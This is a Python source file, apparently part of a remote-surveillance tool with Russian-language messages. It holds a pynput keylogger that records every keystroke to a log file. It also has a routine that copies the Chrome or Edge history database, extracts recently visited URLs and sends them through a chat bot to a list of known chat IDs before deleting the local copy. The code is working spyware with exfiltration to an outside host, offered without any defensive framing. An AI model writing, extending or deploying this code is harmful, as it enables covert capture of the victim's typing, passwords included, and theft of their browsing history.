from config import LOG_FILE, USER, KEYLOG_FILE, bot, LOG_DIR, KNOWN_IDS
from pynput import keyboard
from time import strftime
import sqlite3
import os
from datetime import datetime, timedelta
import logging


def on_press(key):
    try:
        with open(KEYLOG_FILE, "a") as f:
            if key == keyboard.Key.backspace:
                f.write("  [BS]  ")
            elif key == keyboard.Key.tab:
                f.write("   [TAB]   ")
            elif key == keyboard.Key.enter:
                f.write(" [ENTER] \n")
            elif key == keyboard.Key.space:
                f.write(" ")
            elif hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f" [{key.name}] ")
    except Exception as e:
        pass


def start_keylogger():
    with open(KEYLOG_FILE, "a") as f:
        f.write("-------------------------------------------------\n")
        f.write(f"{USER} Log: {strftime('%b %d@%H:%M')}\n")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()


def setup_logging():
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.DEBUG,
        format='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S',
        encoding="utf-8"
    )
    logging.info("🔧 Логирование запущено")


def get_browser_history_log_to_file(browser, limit=100):
    try:
        if browser == 'chrome':
            history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
            output_filename = 'chrome_site.txt'
            header = "🕓 Последние посещённые сайты в Chrome:\n\n"
            temp_db = "chrome_history_copy.db"
        elif browser == 'edge':
            history_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\History'
            output_filename = 'edge_site.txt'
            header = "🕓 Последние посещённые сайты в Edge:\n\n"
            temp_db = "edge_history_copy.db"
        else:
            return f"❌ Неизвестный браузер: {browser}"

        if not os.path.exists(history_path):
            return f"❌ История {browser.capitalize()} не найдена."

        temp_copy = os.path.join(os.getenv("TEMP"), temp_db)
        with open(history_path, 'rb') as src, open(temp_copy, 'wb') as dst:
            dst.write(src.read())

        conn = sqlite3.connect(temp_copy)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()
        conn.close()
        os.remove(temp_copy)

        if not rows:
            return f"📭 История {browser.capitalize()} пуста."

        output_path = os.path.join(LOG_DIR, output_filename)
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(header)
            for url, title, timestamp in rows:
                visit_time = datetime(1601, 1, 1) + timedelta(microseconds=timestamp)
                f.write(f"📅 {visit_time.strftime('%Y-%m-%d %H:%M:%S')}\n🔗 {title or '(без названия)'}\n🌐 {url}\n\n")

        for chat_id in KNOWN_IDS:
            bot.sendDocument(chat_id, open(output_path, 'rb'))
        os.remove(output_path)

    except Exception as e:
        return f"⚠️ Ошибка: {e}"

